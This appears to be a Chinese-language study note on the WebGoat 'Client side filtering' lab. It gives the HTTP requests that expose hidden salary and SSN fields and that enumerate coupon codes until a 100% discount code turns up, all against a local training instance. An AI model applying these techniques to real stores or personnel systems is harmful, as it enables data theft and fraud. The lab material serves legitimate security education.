---
id: 
title: Client side filtering
---
<!-- muse start -->
Web Goat 对返回敏感信息，但只在客户端的界面中不显示的简略示例。
<!-- muse end -->


## 1. 客户端过滤

一个最佳实践是，只向客户端发送他们应该有权访问的信息。在本课程中，过多的信息被发送到了客户端，这就产生了一个严重的访问控制问题。在本次练习中，你的任务是利用服务器返回的多余信息，来发现那些你本不该访问的数据。

## 2. 薪资经理

你当前登录的用户是 Moe Stooge，担任 Goat Hills Financial 的首席安全官（CSO）。你有权限访问公司里除了 CEO Neville Bartholomew 之外所有人的信息。或者说，至少你 **不应该** 有权限访问 CEO 的信息。

对于本次任务，请检查页面内容，看看你能找到哪些额外的信息。

请求为
```http
GET /WebGoat/clientSideFiltering/salaries HTTP/1.1
Host: localhost:3000
```
响应截断为
```json
{
  "Salary" : "200000",
  "UserID" : "111",
  "FirstName" : "John",
  "LastName" : "Wayne",
  "SSN" : "129-69-4572"
}, {
  "Salary" : "450000",
  "UserID" : "112",
  "FirstName" : "Neville",
  "LastName" : "Bartholomew",
  "SSN" : "111-111-1111"
}
```
响应包含不显示在界面中的信息

## 3. 知道代码就不用付钱...

在优惠代码处输入`foo`作为测试，对应 GET 的检测优惠码请求
```http
GET /WebGoat/clientSideFiltering/challenge-store/coupons/foo HTTP/1.1
```
```json
{
  "code" : "no",
  "discount" : 0
}
```
尝试提交表单的基准请求
```http
POST /WebGoat/clientSideFiltering/getItForFree HTTP/1.1
Host: localhost:3000

checkoutCode=foo
```

查看优惠代码附近的 HTML 代码得到注释
```html
<!--
Checkout code: webgoat, owasp, owasp-webgoat
-->
```
测试这三个优惠代码
`webgoat` 与 `owasp` 对应折扣 `25`
`owasp-webgoat` 对应折扣 `50`
```http
GET /WebGoat/clientSideFiltering/challenge-store/coupons/webgoat HTTP/1.1
```
```json
{
  "code" : "webgoat",
  "discount" : 25
}
```

对 URL 路径进行探测
```http
GET /WebGoat/clientSideFiltering/challenge-store/coupons HTTP/1.1
```
响应返回所有优惠期的 JSON，其中包含 `100` 折扣的目标优惠代码
```json
{
    "code" : "get_it_for_free",
    "discount" : 100
  }
```
